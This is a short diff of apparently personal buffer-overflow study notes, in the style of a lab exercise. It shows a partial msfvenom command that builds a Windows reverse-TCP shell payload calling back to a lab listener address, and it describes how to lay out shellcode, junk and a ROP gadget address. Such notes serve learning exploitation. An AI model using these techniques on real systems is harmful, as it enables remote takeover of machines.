@@ -36,7 +36,7 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
 
 ## Finding ROP in windows immunity debugger
 
-* Not when we use ROP gadget, we inject our shellcode inside the "junk" text itself. From experience we  know that there is call made back to the stack after execution of ROP gadget which points to start of the "junk" address.
+* Not when we use ROP gadget, we inject our shellcode inside the "junk" text itself. From experience we  know that "**there is call made back to the stack"** after execution of ROP gadget which points to start of the "junk" address.
 * Here the format of **payload = buf + junk\_remaining + ROP\_addr**
   * where `buf` is our reverse tcp shellcode
   * where `junk_remaining` = junk - len\(buf\)
